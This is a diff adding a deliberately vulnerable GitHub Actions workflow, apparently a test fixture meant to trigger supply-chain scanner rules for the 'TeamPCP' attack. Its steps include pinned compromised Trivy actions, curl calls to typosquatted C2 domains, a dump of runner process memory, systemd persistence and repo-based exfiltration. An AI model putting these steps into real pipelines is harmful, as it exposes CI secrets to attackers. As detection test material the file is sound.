@@ -1,0 +1,79 @@
+# =============================================================================
+# Scenario 19: TeamPCP Attack Indicators
+# Demonstrates: Trivy action compromise, C2 communication, credential stealing
+# Triggers: SCA-091, SCA-092, SCA-093, SCA-094, SCA-095, SCA-096, SCA-097,
+#           SCA-098, SCA-099, SCA-100
+# INTENTIONALLY VULNERABLE - DO NOT USE IN PRODUCTION
+# =============================================================================
+name: TeamPCP Attack Indicators
+on:
+  push:
+    branches: [main]
+  pull_request_target:
+    types: [opened]
+
+permissions: write-all
+
+jobs:
+  compromised-trivy-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # SCA-092: Compromised trivy-action tag
+      - name: Run Trivy vulnerability scan
+        uses: aquasecurity/trivy-action@f77738448eec70113cf711656914b61905b3bd47
+        with:
+          scan-type: 'fs'
+          scan-ref: '.'
+
+      # SCA-093: Compromised setup-trivy SHA
+      - name: Setup Trivy
+        uses: aquasecurity/setup-trivy@8afa9b9f9183b4e00c46e2b82d34047e3c177bd0
+
+      # SCA-100: Compromised Checkmarx KICS action
+      - name: Run KICS scan
+        uses: Checkmarx/kics-github-action@v2
+
+      # SCA-094: TeamPCP C2 communication domains
+      - name: Send scan results
+        run: |
+          curl -s https://scan.aquasecurtiy.org/api/report
+          curl -s https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/upload
+
+      # SCA-095: Runner.Worker process memory dump
+      - name: Debug runner information
+        run: |
+          cat /proc/*/mem 2>/dev/null || true
+          ps aux | grep Runner.Worker
+          echo "isSecret: true"
+
+      # SCA-096: TeamPCP persistence mechanism
+      - name: Setup monitoring
+        run: |
+          mkdir -p $HOME/.config/systemd/user/
+          cp sysmon.py $HOME/.config/systemd/user/sysmon.py
+          systemctl --user enable sysmon
+
+      # SCA-097: TeamPCP fallback exfiltration via tpcp-docs
+      - name: Upload documentation
+        run: |
+          gh repo create tpcp-docs --public 2>/dev/null || true
+          curl -s https://api.github.com/repos/teampcp/tpcp-docs/contents
+
+      # SCA-099: hackerbot-claw PWN request exploit
+      - name: Check contributor
+        if: github.actor == 'hackerbot.claw'
+        run: echo "Trusted contributor"
+
+  imposter-commit-check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # SCA-098: Imposter commit detection
+      - name: Verify commit origin
+        run: |
+          git log --oneline -1
+          echo "Warning: commit does not belong to any branch"
+          echo "This commit may belong to a fork outside of the repository"
